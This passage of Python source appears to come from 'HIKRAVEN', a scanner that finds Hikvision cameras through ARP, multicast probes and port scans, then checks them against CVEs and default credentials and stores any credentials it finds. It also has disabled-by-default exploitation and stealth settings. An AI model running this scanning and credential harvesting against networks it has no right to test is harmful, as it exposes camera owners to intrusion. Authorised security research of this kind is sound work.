    chars = string.ascii_letters + string.digits + "!@#$%^&*()_+-="
    return ''.join(secrets.choice(chars) for _ in range(length))

def chunks(lst: List, n: int):
    for i in range(0, len(lst), n):
        yield lst[i:i + n]

def safe_parse_xml(data: bytes) -> Optional[ET.Element]:
    try:
        return ET.fromstring(data)
    except ET.ParseError:
        return None

def format_bytes(size: int) -> str:
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if size < 1024.0:
            return f"{size:.1f} {unit}"
        size /= 1024.0
    return f"{size:.1f} PB"

def sanitize_filename(filename: str) -> str:
    return re.sub(r'[^a-zA-Z0-9\-_.]', '_', filename)

def get_timestamp() -> str:
    return datetime.now().strftime("%Y%m%d_%H%M%S")

def detect_platform() -> Dict[str, str]:
    return {
        'system': platform.system(),
        'release': platform.release(),
        'version': platform.version(),
        'machine': platform.machine(),
        'processor': platform.processor(),
        'hostname': socket.gethostname()
    }

class ConfigManager:
    def __init__(self, config_path: str = Constants.CONFIG_PATH):
        self.config_path = config_path
        self.config = self._default_config()
        self.load()
        self._validate()
    
    def _default_config(self) -> dict:
        return {
            'general': {
                'name': 'HIKRAVEN',
                'company': 'Security Research Team'
            },
            'interface': {
                'auto_detect': True,
                'preferred_interface': None,
                'scan_timeout': 5,
                'promiscuous': False
            },
            'scan': {
                'max_threads': 100,
                'timeout': 10,
                'rate_limit': 20,
                'stealth_mode': False,
                'random_delay': False,
                'delay_min': 0.1,
                'delay_max': 1.0,
                'max_retries': 3,
                'scan_interval': 5
            },
            'discovery': {
                'passive_timeout': 30,
                'use_arp': True,
                'use_multicast': True,
                'use_port_scan': True,
                'use_ping_scan': True,
                'use_netbios': True,
                'use_upnp': True,
                'ports': Constants.HIKVISION_PORTS,
                'ping_timeout': 2,
                'port_scan_timeout': 1.5,
                'max_hosts': 65535,
                'discovery_methods': ['arp', 'multicast', 'ping', 'portscan']
            },
            'vulnerability': {
                'enabled': True,
                'check_default_creds': True,
                'cves': list(Constants.CVE_SIGNATURES.keys()),
                'timeout_per_check': 5,
                'max_checks_per_device': 20,
                'aggressive': False,
                'deep_scan': False
            },
            'exploitation': {
                'enabled': False,
                'auto_exploit': False,
                'max_attempts': 3,
                'safe_mode': True,
                'backup_credentials': True
            },
            'reporting': {
                'formats': ['json', 'html', 'csv'],
                'output_dir': Constants.OUTPUT_DIR,
                'include_all_devices': True,
                'include_sensitive': False,
                'template': 'professional',
                'theme': 'dark',
                'compress': False,
                'auto_open': False
            },
            'database': {
                'path': Constants.DB_PATH,
                'backup_interval': 3600,
                'max_size_mb': 100,
                'encrypt_credentials': True
            },
            'logging': {
                'level': 'INFO',
                'file': Constants.LOG_PATH,
                'max_size_mb': 10,
                'backup_count': 5,
                'console_output': True
            },
            'plugins': {
                'enabled': True,
                'directory': Constants.PLUGIN_DIR,
                'auto_load': True,
                'trusted_plugins': []
            },
            'api': {
                'enabled': False,
                'host': '127.0.0.1',
                'port': 8080,
                'api_key': None,
                'cors_origins': []
            },
            'notifications': {
                'enabled': False,
                'webhook_url': None,
                'email': None,
                'slack_webhook': None
            }
        }
    
    def load(self) -> dict:
        if os.path.exists(self.config_path):
            try:
                with open(self.config_path, 'r') as f:
                    loaded = yaml.safe_load(f)
                self.config = self._deep_merge(self.config, loaded)
            except Exception as e:
                print(f"Warning: Failed to load config: {e}")
        return self.config
    
    def save(self) -> bool:
        try:
            os.makedirs(os.path.dirname(self.config_path) or '.', exist_ok=True)
            with open(self.config_path, 'w') as f:
                yaml.dump(self.config, f, default_flow_style=False, indent=2)
            return True
        except Exception as e:
            print(f"Warning: Failed to save config: {e}")
            return False
    
    def _deep_merge(self, base: dict, override: dict) -> dict:
        result = base.copy()
        for key, value in override.items():
            if key in result and isinstance(result[key], dict) and isinstance(value, dict):
                result[key] = self._deep_merge(result[key], value)
            else:
                result[key] = value
        return result
    
    def _validate(self):
        required = ['scan', 'discovery', 'vulnerability', 'reporting']
        for key in required:
            if key not in self.config:
                self.config[key] = self._default_config()[key]
    
    def get(self, key: str, default=None):
        parts = key.split('.')
        current = self.config
        for part in parts:
            if isinstance(current, dict) and part in current:
                current = current[part]
            else:
                return default
        return current
    
    def set(self, key: str, value: Any):
        parts = key.split('.')
        current = self.config
        for part in parts[:-1]:
            if part not in current:
                current[part] = {}
            current = current[part]
        current[parts[-1]] = value

class Logger:
    def __init__(self, log_file: str = Constants.LOG_PATH, 
                 level: str = 'INFO', verbose: bool = False,
                 console_output: bool = True):
        self.verbose = verbose
        self.console_output = console_output
        self.logger = logging.getLogger('HikRaven')
        self.logger.setLevel(logging.DEBUG if verbose else getattr(logging, level.upper()))
        
        self.logger.handlers.clear()
        
        file_handler = logging.FileHandler(log_file)
        file_handler.setLevel(logging.DEBUG)
        file_format = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        file_handler.setFormatter(file_format)
        self.logger.addHandler(file_handler)
        
        if console_output:
            console_handler = logging.StreamHandler()
            console_handler.setLevel(logging.DEBUG if verbose else logging.INFO)
            self.logger.addHandler(console_handler)
        
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
        
        self._stopped = False
        self._last_progress = ""
    
    def _signal_handler(self, signum, frame):
        self._stopped = True
        self.warning("Received interrupt signal, cleaning up...")
    
    def _log(self, level: str, msg: str, *args, **kwargs):
        if self._stopped:
            return
        
        if level == 'PROGRESS' and msg == self._last_progress:
            return
        
        if level == 'PROGRESS':
            self._last_progress = msg
        
        log_method = getattr(self.logger, level.lower(), self.logger.info)
        log_method(msg, *args, **kwargs)
    
    def debug(self, msg: str):
        if self.verbose:
            self._log('DEBUG', f"{Fore.CYAN}[*] {msg}{Style.RESET_ALL}")
    
    def info(self, msg: str):
        self._log('INFO', f"{Fore.BLUE}[+] {msg}{Style.RESET_ALL}")
    
    def success(self, msg: str):
        self._log('INFO', f"{Fore.GREEN}[✓] {msg}{Style.RESET_ALL}")
    
    def warning(self, msg: str):
        self._log('WARNING', f"{Fore.YELLOW}[!] {msg}{Style.RESET_ALL}")
    
    def error(self, msg: str):
        self._log('ERROR', f"{Fore.RED}[-] {msg}{Style.RESET_ALL}")
    
    def critical(self, msg: str):
        self._log('CRITICAL', f"{Fore.RED}[‼] {msg}{Style.RESET_ALL}")
    
    def highlight(self, msg: str):
        self._log('INFO', f"{Fore.MAGENTA}[★] {msg}{Style.RESET_ALL}")
    
    def section(self, msg: str):
        self._log('INFO', f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        self._log('INFO', f"{Fore.CYAN}  {msg}{Style.RESET_ALL}")
        self._log('INFO', f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    
    def progress(self, current: int, total: int, msg: str = "", 
                 bar_length: int = 30):
        if total <= 0:
            return
        percent = (current / total) * 100
        filled = int(bar_length * current // total)
        bar = '█' * filled + '░' * (bar_length - filled)
        self._log('PROGRESS', f"\r[{bar}] {percent:.1f}% {msg}")
    
    def table(self, headers: List[str], rows: List[List[Any]], 
              title: str = None):
        if not self.console_output:
            return
        
        try:
            table = Table(title=title, box=box.ROUNDED, border_style="cyan")
            for header in headers:
                table.add_column(header, style="cyan")
            
            for row in rows:
                table.add_row(*[str(cell) for cell in row])
            
            console.print(table)
        except:
            if title:
                self._log('INFO', f"\n{title}")
            
            col_widths = [len(h) for h in headers]
            for row in rows:
                for i, cell in enumerate(row):
                    col_widths[i] = max(col_widths[i], len(str(cell)))
            
            separator = '+' + '+'.join('-' * (w + 2) for w in col_widths) + '+'
            header_row = '|' + '|'.join(f' {h:^{col_widths[i]}} ' 
                                       for i, h in enumerate(headers)) + '|'
            
            self._log('INFO', separator)
            self._log('INFO', header_row)
            self._log('INFO', separator)
            
            for row in rows:
                row_str = '|' + '|'.join(f' {str(cell):<{col_widths[i]}} ' 
                                        for i, cell in enumerate(row)) + '|'
                self._log('INFO', row_str)
            
            self._log('INFO', separator)
    
    def rich_panel(self, content: str, title: str = "", border_style: str = "cyan"):
        if self.console_output:
            panel = Panel(content, title=title, border_style=border_style)
            console.print(panel)
    
    def rich_status(self, message: str):
        if self.console_output:
            console.status(f"[bold cyan]{message}[/bold cyan]")
    
    def stop(self):
        self._stopped = True

class Database:
    def __init__(self, db_path: str = Constants.DB_PATH, 
                 encrypt: bool = True):
        self.db_path = db_path
        self.encrypt = encrypt
        self.cipher = None
        self._last_backup = time.time()
        
        if encrypt:
            self._init_encryption()
        
        self._init_database()
    
    def _init_encryption(self):
        key = self._get_or_create_key()
        self.cipher = Fernet(key)
    
    def _get_or_create_key(self) -> bytes:
        key_file = Constants.KEY_FILE
        if os.path.exists(key_file):
            with open(key_file, 'rb') as f:
                return f.read()
        else:
            key = Fernet.generate_key()
            with open(key_file, 'wb') as f:
                f.write(key)
            os.chmod(key_file, 0o600)
            return key
    
    def _encrypt(self, data: str) -> str:
        if not self.encrypt or not data:
            return data
        try:
            return self.cipher.encrypt(data.encode()).decode()
        except:
            return data
    
    def _decrypt(self, data: str) -> str:
        if not self.encrypt or not data:
            return data
        try:
            return self.cipher.decrypt(data.encode()).decode()
        except:
            return data
    
    def _init_database(self):
        self._check_backup()
        
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("PRAGMA foreign_keys = ON")
            conn.execute("PRAGMA journal_mode = WAL")
            conn.execute("PRAGMA synchronous = NORMAL")
            
            cursor = conn.cursor()
            
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS devices (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip_address TEXT NOT NULL,
                    mac_address TEXT,
                    hostname TEXT,
                    description TEXT,
                    serial_number TEXT,
                    software_version TEXT,
                    firmware_version TEXT,
                    dsp_version TEXT,
                    model TEXT,
                    manufacturer TEXT,
                    activation_status TEXT,
                    cloud_managed INTEGER DEFAULT 0,
                    confidence REAL DEFAULT 1.0,
                    fingerprint TEXT,
                    severity_score INTEGER DEFAULT 0,
                    threat_level TEXT DEFAULT 'LOW',
                    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    UNIQUE(ip_address, mac_address)
                )
            """)
            
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS vulnerabilities (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    device_id INTEGER,
                    cve_id TEXT,
                    severity TEXT,
                    category TEXT,
                    description TEXT,
                    cvss_score REAL,
                    discovered TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    exploited INTEGER DEFAULT 0,
                    fixed INTEGER DEFAULT 0,
                    proof TEXT,
                    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
                )
            """)
            
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS scan_history (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    scan_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    total_devices INTEGER,
                    vulnerable_devices INTEGER,
                    total_vulnerabilities INTEGER,
                    scan_type TEXT,
                    duration_seconds REAL,
                    network_range TEXT,
                    interface TEXT,
                    status TEXT DEFAULT 'completed'
                )
            """)
            
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS credentials (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    device_id INTEGER,
                    username TEXT,
                    password TEXT,
                    encrypted INTEGER DEFAULT 1,
                    discovered TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
                )
            """)
            
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS ports (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    device_id INTEGER,
                    port INTEGER,
                    protocol TEXT,
                    service TEXT,
                    discovered TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
                )
            """)
            
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS metrics (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    scan_id INTEGER,
                    metric_name TEXT,
                    metric_value TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (scan_id) REFERENCES scan_history(id)
                )
            """)
            
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    level TEXT,
                    message TEXT,
                    source TEXT
                )
            """)
            
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS interfaces (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT UNIQUE,
                    mac_address TEXT,
                    ip_address TEXT,
                    type TEXT,
                    status TEXT,
                    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            
            cursor.execute("CREATE INDEX IF NOT EXISTS idx_devices_ip ON devices(ip_address)")
            cursor.execute("CREATE INDEX IF NOT EXISTS idx_devices_mac ON devices(mac_address)")
            cursor.execute("CREATE INDEX IF NOT EXISTS idx_devices_fingerprint ON devices(fingerprint)")
            cursor.execute("CREATE INDEX IF NOT EXISTS idx_vulns_cve ON vulnerabilities(cve_id)")
            cursor.execute("CREATE INDEX IF NOT EXISTS idx_vulns_device ON vulnerabilities(device_id)")
            cursor.execute("CREATE INDEX IF NOT EXISTS idx_vulns_severity ON vulnerabilities(severity)")
            cursor.execute("CREATE INDEX IF NOT EXISTS idx_interfaces_name ON interfaces(name)")
            
            conn.commit()
    
    @safe_operation(default=0)
    def save_device(self, device: 'HikDevice') -> int:
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            
            if not device.fingerprint:
                device.fingerprint = generate_device_fingerprint(device)
            
            severity_score = device.get_severity_score()
            threat_level = self._get_threat_level(severity_score)
            
            cursor.execute("""
                INSERT OR REPLACE INTO devices 
                (ip_address, mac_address, hostname, description, serial_number, 
                 software_version, firmware_version, dsp_version, model, 
                 manufacturer, activation_status, cloud_managed, confidence, 
                 fingerprint, severity_score, threat_level, last_seen)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
            """, (
                device.ip_address,
                device.mac_address,
                device.hostname,
                device.description,
                device.serial_number,
                device.software_version,
                device.firmware_version,
                device.dsp_version,
                device.model,
                device.manufacturer,
                device.activation_status,
                1 if device.is_cloud_managed else 0,
                device.confidence,
                device.fingerprint,
                severity_score,
                threat_level
            ))
            
            device_id = cursor.lastrowid
            
            if device.open_ports:
                cursor.execute("DELETE FROM ports WHERE device_id = ?", (device_id,))
                for port in device.open_ports:
                    cursor.execute("""
                        INSERT INTO ports (device_id, port, protocol, service)
                        VALUES (?, ?, ?, ?)
                    """, (device_id, port, 'tcp', self._get_service_name(port)))
            
            if device.credentials:
                cursor.execute("DELETE FROM credentials WHERE device_id = ?", (device_id,))
                for username, password in device.credentials:
                    encrypted_pass = self._encrypt(password)
                    cursor.execute("""
                        INSERT INTO credentials (device_id, username, password)
                        VALUES (?, ?, ?)
                    """, (device_id, username, encrypted_pass))
            
            conn.commit()
            return device_id
    
    def _get_threat_level(self, score: int) -> str:
        if score >= 20:
            return "CRITICAL"
        elif score >= 10:
            return "HIGH"
        elif score >= 5:
            return "MEDIUM"
        elif score >= 1:
            return "LOW"
        return "INFO"
    
    def _get_service_name(self, port: int) -> str:
        services = {
            80: 'http', 443: 'https', 554: 'rtsp', 8000: 'hikvision',
            37020: 'hikvision-probe', 8443: 'https-alt', 8080: 'http-alt',
            9090: 'http-alt', 7001: 'weblogic', 7002: 'weblogic',
            37777: 'hikvision-rtsp', 37778: 'hikvision-rtsp'
        }
        return services.get(port, 'unknown')
    
    @safe_operation()
    def save_vulnerability(self, device_ip: str, vuln_data: dict):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            
            cursor.execute("SELECT id FROM devices WHERE ip_address = ?", (device_ip,))
            result = cursor.fetchone()
            if not result:
                cursor.execute("INSERT INTO devices (ip_address) VALUES (?)", (device_ip,))
                device_id = cursor.lastrowid
            else:
                device_id = result[0]
            
            cursor.execute("""
                INSERT OR IGNORE INTO vulnerabilities 
                (device_id, cve_id, severity, category, description, cvss_score, proof)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            """, (
                device_id,
                vuln_data.get('cve_id', 'UNKNOWN'),
                vuln_data.get('severity', 'UNKNOWN'),
                vuln_data.get('category', 'UNKNOWN'),
                vuln_data.get('description', ''),
                vuln_data.get('cvss_score', 0.0),
                vuln_data.get('proof', '')
            ))
            
            conn.commit()
    
    @safe_operation(default={})
    def get_statistics(self) -> dict:
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            stats = {}
            
            cursor.execute("SELECT COUNT(*) FROM devices")
            stats['total_devices'] = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(DISTINCT device_id) FROM vulnerabilities")
            stats['vulnerable_devices'] = cursor.fetchone()[0] or 0
            
            cursor.execute("SELECT COUNT(*) FROM vulnerabilities")
            stats['total_vulnerabilities'] = cursor.fetchone()[0]
            
            cursor.execute("""
                SELECT severity, COUNT(*) FROM vulnerabilities 
                GROUP BY severity
            """)
            stats['by_severity'] = dict(cursor.fetchall())
            
            cursor.execute("""
                SELECT category, COUNT(*) FROM vulnerabilities 
                GROUP BY category
            """)
            stats['by_category'] = dict(cursor.fetchall())
            
            cursor.execute("""
                SELECT scan_time, total_devices, vulnerable_devices, 
                       total_vulnerabilities, duration_seconds, network_range, interface
                FROM scan_history 
                ORDER BY scan_time DESC LIMIT 1
            """)
            result = cursor.fetchone()
            if result:
                stats['last_scan'] = {
                    'time': result[0],
                    'devices': result[1],
                    'vulnerable': result[2],
                    'vulnerabilities': result[3],
                    'duration': result[4],
                    'network': result[5],
                    'interface': result[6]
                }
            
            cursor.execute("""
                SELECT port, COUNT(*) as count 
                FROM ports 
                GROUP BY port 
                ORDER BY count DESC
                LIMIT 10
            """)
            stats['common_ports'] = cursor.fetchall()
            
            cursor.execute("""
                SELECT cve_id, COUNT(*) as count
                FROM vulnerabilities
                GROUP BY cve_id
                ORDER BY count DESC
            """)
            stats['cve_stats'] = cursor.fetchall()
            
            return stats
    
    def _check_backup(self):
        if not os.path.exists(self.db_path):
            return
        
        size_mb = os.path.getsize(self.db_path) / (1024 * 1024)
        if size_mb > 100:
            backup_path = f"{self.db_path}.{get_timestamp()}.bak"
            shutil.copy2(self.db_path, backup_path)
            try:
                with open(backup_path, 'rb') as f:
                    compressed = zlib.compress(f.read())
                with open(f"{backup_path}.gz", 'wb') as f:
                    f.write(compressed)
                os.remove(backup_path)
            except:
                pass
    
    def close(self):
        pass

@dataclass
class HikDevice:
    ip_address: str
    
    mac_address: Optional[str] = None
    hostname: Optional[str] = None
    description: Optional[str] = None
    serial_number: Optional[str] = None
    model: Optional[str] = None
    manufacturer: Optional[str] = None
    software_version: Optional[str] = None
    firmware_version: Optional[str] = None
    dsp_version: Optional[str] = None
    activation_status: Optional[str] = None
    password_reset_ability: Optional[str] = None
    
    open_ports: List[int] = field(default_factory=list)
    services: Dict[int, str] = field(default_factory=dict)
    
    vulnerabilities: List[dict] = field(default_factory=list)
    credentials: List[Tuple[str, str]] = field(default_factory=list)
    
    first_seen: float = field(default_factory=time.time)
    last_seen: float = field(default_factory=time.time)
    confidence: float = 1.0
    is_cloud_managed: bool = False
    device_info: dict = field(default_factory=dict)
    fingerprint: str = ""
    tags: List[str] = field(default_factory=list)
    interface: str = ""
    
    def __post_init__(self):
        if not self.fingerprint:
            self.fingerprint = generate_device_fingerprint(self)
    
    def to_dict(self) -> dict:
        return {
            'ip_address': self.ip_address,
            'mac_address': self.mac_address,
            'hostname': self.hostname,
            'description': self.description,
            'serial_number': self.serial_number,
            'model': self.model,
            'manufacturer': self.manufacturer,
            'software_version': self.software_version,
            'firmware_version': self.firmware_version,
            'dsp_version': self.dsp_version,
            'activation_status': self.activation_status,
            'open_ports': self.open_ports,
            'services': self.services,
            'vulnerabilities': self.vulnerabilities,
            'credentials': self.credentials,
            'is_cloud_managed': self.is_cloud_managed,
            'confidence': self.confidence,
            'fingerprint': self.fingerprint,
            'tags': self.tags,
            'device_info': self.device_info,
            'interface': self.interface,
            'severity_score': self.get_severity_score(),
            'threat_level': self.get_threat_level()
        }
    
    def add_vulnerability(self, cve_id: str, severity: str, 
                         description: str, cvss_score: float = 0.0, 
                         proof: str = "", category: str = "UNKNOWN"):
        vuln = {
            'cve_id': cve_id,
            'severity': severity,
            'category': category,
            'description': description,
            'cvss_score': cvss_score,
            'proof': proof,
            'discovered': datetime.now().isoformat()
        }
        self.vulnerabilities.append(vuln)
    
    def get_vulnerability_count(self) -> int:
        return len(self.vulnerabilities)
    
    def get_severity_score(self) -> int:
        if not self.vulnerabilities:
            return 0
        
        score = 0
        for vuln in self.vulnerabilities:
            severity = vuln.get('severity', 'LOW')
            if severity == 'CRITICAL':
                score += 10
            elif severity == 'HIGH':
                score += 7
            elif severity == 'MEDIUM':
                score += 4
            elif severity == 'LOW':
                score += 1
        return score
    
    def get_threat_level(self) -> str:
        score = self.get_severity_score()
        if score >= 20:
            return "CRITICAL"
        elif score >= 10:
            return "HIGH"
        elif score >= 5:
            return "MEDIUM"
        elif score >= 1:
            return "LOW"
        return "INFO"
    
    def merge(self, other: 'HikDevice'):
        if other.mac_address and not self.mac_address:
            self.mac_address = other.mac_address
        if other.hostname and not self.hostname:
            self.hostname = other.hostname
        if other.model and not self.model:
            self.model = other.model
        if other.manufacturer and not self.manufacturer:
            self.manufacturer = other.manufacturer
        if other.software_version and not self.software_version:
            self.software_version = other.software_version
        if other.firmware_version and not self.firmware_version:
            self.firmware_version = other.firmware_version
        if other.serial_number and not self.serial_number:
            self.serial_number = other.serial_number
        if other.interface and not self.interface:
            self.interface = other.interface
        
        for port in other.open_ports:
            if port not in self.open_ports:
                self.open_ports.append(port)
        
        self.services.update(other.services)
        
        existing_cves = {v['cve_id'] for v in self.vulnerabilities}
        for vuln in other.vulnerabilities:
            if vuln['cve_id'] not in existing_cves:
                self.vulnerabilities.append(vuln)
        
        for cred in other.credentials:
            if cred not in self.credentials:
                self.credentials.append(cred)
        
        for tag in other.tags:
            if tag not in self.tags:
                self.tags.append(tag)
        
        self.last_seen = max(self.last_seen, other.last_seen)
        self.first_seen = min(self.first_seen, other.first_seen)
        
        self.confidence = max(self.confidence, other.confidence)
        
        self.fingerprint = generate_device_fingerprint(self)

@dataclass
class ScanResult:
    devices: List[HikDevice] = field(default_factory=list)
    total_devices: int = 0
    vulnerable_devices: int = 0
    total_vulnerabilities: int = 0
    scan_duration: float = 0.0
    scan_type: str = "passive"
    network_range: str = ""
    interface: str = ""
    start_time: float = field(default_factory=time.time)
    end_time: float = 0.0
    errors: List[str] = field(default_factory=list)
    warnings: List[str] = field(default_factory=list)
    
    @property
    def duration(self) -> float:
        if self.end_time:
            return self.end_time - self.start_time
        return self.scan_duration
    
    def to_dict(self) -> dict:
        return {
            'total_devices': self.total_devices,
            'vulnerable_devices': self.vulnerable_devices,
            'total_vulnerabilities': self.total_vulnerabilities,
            'scan_duration': self.duration,
            'scan_type': self.scan_type,
            'network_range': self.network_range,
            'interface': self.interface,
            'start_time': datetime.fromtimestamp(self.start_time).isoformat(),
            'end_time': datetime.fromtimestamp(self.end_time).isoformat() if self.end_time else None,
            'devices': [d.to_dict() for d in self.devices],
            'errors': self.errors,
            'warnings': self.warnings
        }

class DiscoveryEngine:
    def __init__(self, interface: str, local_ip: str, logger: Logger,
                 config: ConfigManager, rate_limiter: 'RateLimiter' = None,
                 sudo_manager: SudoManager = None):
        self.interface = interface
        self.local_ip = local_ip
        self.logger = logger
        self.config = config
        self.rate_limiter = rate_limiter or RateLimiter(
            config.get('scan.rate_limit', 20)
        )
        self.sudo_manager = sudo_manager or SudoManager(logger)
        self.interface_manager = InterfaceManager(logger, self.sudo_manager)
        self.discovered_devices: Dict[str, HikDevice] = {}
        self.db = Database()
        self._stop_scan = False
        self.known_ouis = Constants.HIKVISION_OUIS
        self.fingerprints: Dict[str, str] = {}
    
    @timing_decorator
    def discover(self, subnet: str = None, passive_timeout: int = 30) -> List[HikDevice]:
        self.logger.section("Device Discovery")
        self.logger.info(f"Using interface: {self.interface}")
        self.logger.info(f"Local IP: {self.local_ip}")
        
        if self.sudo_manager.has_sudo:
            self.logger.info("Running with elevated privileges - full discovery enabled")
        else:
            self.logger.warning("Limited privileges - some discovery features may be restricted")
        
        if not self.interface_manager.validate_interface(self.interface):
            self.logger.warning(f"Interface {self.interface} may not be valid")
        
        interface_info = self.interface_manager.get_interface(self.interface)
        if interface_info:
            self.logger.debug(f"Interface type: {interface_info['type']}")
            self.logger.debug(f"Interface MAC: {interface_info['mac']}")
        
        if self.config.get('discovery.use_arp', True):
            self.passive_discovery(timeout=passive_timeout)
        
        if self.config.get('discovery.use_multicast', True):
            self._send_multicast_probe()
        
        if self.config.get('discovery.use_port_scan', True):
            self._port_scan_discovered()
        
        if subnet and self.config.get('discovery.use_ping_scan', True):
            self._scan_subnet(subnet)
        
        self._enrich_devices()
        
        for device in self.discovered_devices.values():
            device.interface = self.interface
            self.db.save_device(device)
        
        devices = list(self.discovered_devices.values())
        self.logger.success(f"Discovered {len(devices)} devices")
        
        return devices
    
    def passive_discovery(self, timeout: int = 30) -> Dict[str, HikDevice]:
        self.logger.info(f"Passive ARP discovery for {timeout}s...")
        self.logger.debug("Using ARP cache-based discovery (compatible with all platforms)")
        
        found_ips = set()
        
        try:
            peers = self.interface_manager.get_interface_peers(self.interface, timeout)
            
            for peer in peers:
                ip = peer['ip']
                mac = peer['mac']
                if ip not in found_ips and ip != self.local_ip:
                    if not ip.startswith('127.'):
                        device = HikDevice(
                            ip_address=ip,
                            mac_address=mac,
                            interface=self.interface
                        )
                        
                        for oui, manufacturer in self.known_ouis.items():
                            if mac and mac.lower().startswith(oui):
                                device.manufacturer = manufacturer
                                break
                        
                        self.discovered_devices[ip] = device
                        found_ips.add(ip)
                        self.logger.debug(f"Found device: {ip} ({mac})")
                        
        except Exception as e:
            self.logger.error(f"ARP discovery failed: {e}")
            self.logger.info("Attempting ping sweep fallback...")
            self._fallback_ping_discovery()
        
        return self.discovered_devices
    
    def _fallback_ping_discovery(self):
        try:
            self.logger.info("Using ping sweep for discovery...")
            for i in range(1, 255):
                if self._stop_scan:
                    break
                ip = f"192.168.0.{i}"
                if ip != self.local_ip:
                    if self._ping_host(ip):
                        device = HikDevice(
                            ip_address=ip,
                            interface=self.interface
                        )
                        self.discovered_devices[ip] = device
                        self.logger.debug(f"Found device via ping: {ip}")
        except Exception as e:
            self.logger.debug(f"Fallback ping discovery error: {e}")
    
    @safe_operation()
    def _send_multicast_probe(self):
        self.logger.debug("Sending multicast probe...")
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
        sock.settimeout(2)
        
        if self.sudo_manager.has_sudo:
            try:
                if self.interface:
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, 
                                   self.interface.encode())
            except:
                pass
        
        try:
            sock.bind((self.local_ip, 0))
        except:
            try:
                sock.bind(('0.0.0.0', 0))
            except:
                pass
        
        probe = '<?xml version="1.0" encoding="utf-8"?><Probe>' \
                '<Uuid>HIKRAVEN-SCAN</Uuid><Types>inquiry</Types></Probe>'
        
        sock.sendto(probe.encode(), ('239.255.255.250', 37020))
        
        start_time = time.time()
        while time.time() - start_time < 5 and not self._stop_scan:
            try:
                data, addr = sock.recvfrom(4096)
                if data:
                    self._parse_device_response(data, addr[0])
            except socket.timeout:
                break
            except Exception as e:
                self.logger.debug(f"Multicast receive error: {e}")
                break
        
        sock.close()
    
    def _parse_device_response(self, data: bytes, ip: str):
        try:
            root = ET.fromstring(data)
            
            ip_addr = root.find('IPv4Address')
            device_ip = ip_addr.text if ip_addr is not None else ip
            
            if device_ip in self.discovered_devices:
                device = self.discovered_devices[device_ip]
            else:
                device = HikDevice(ip_address=device_ip, interface=self.interface)
            
            desc = root.find('DeviceDescription')
            if desc is not None and desc.text:
                device.description = desc.text
            
            sn = root.find('DeviceSN')
            if sn is not None and sn.text:
                device.serial_number = sn.text
            
            mac = root.find('MAC')
            if mac is not None and mac.text:
                mac_addr = mac.text.replace('-', ':').lower()
                device.mac_address = mac_addr
                for oui, manufacturer in self.known_ouis.items():
                    if mac_addr.startswith(oui):
                        device.manufacturer = manufacturer
                        break
            
            sw_ver = root.find('SoftwareVersion')
            if sw_ver is not None and sw_ver.text:
                device.software_version = sw_ver.text
            
            fw_ver = root.find('FirmwareVersion')
            if fw_ver is not None and fw_ver.text:
                device.firmware_version = fw_ver.text
            
            dsp_ver = root.find('DSPVersion')
            if dsp_ver is not None and dsp_ver.text:
                device.dsp_version = dsp_ver.text
            
            activated = root.find('Activated')
            if activated is not None and activated.text:
                device.activation_status = activated.text
            
            if device.ip_address not in self.discovered_devices:
                self.discovered_devices[device.ip_address] = device
            else:
                self.discovered_devices[device.ip_address].merge(device)
            
            self.logger.debug(f"Discovered device via multicast: {device.ip_address}")
            
        except ET.ParseError:
            self.logger.debug(f"Failed to parse XML response from {ip}")
        except Exception as e:
            self.logger.debug(f"Parse error: {e}")
    
    @safe_operation()
    def _port_scan_discovered(self):
        devices_to_scan = list(self.discovered_devices.keys())
        if not devices_to_scan:
            return
        
        self.logger.debug(f"Port scanning {len(devices_to_scan)} discovered devices...")
        
        ports = self.config.get('discovery.ports', Constants.HIKVISION_PORTS)
        timeout = self.config.get('discovery.port_scan_timeout', 1.5)
        
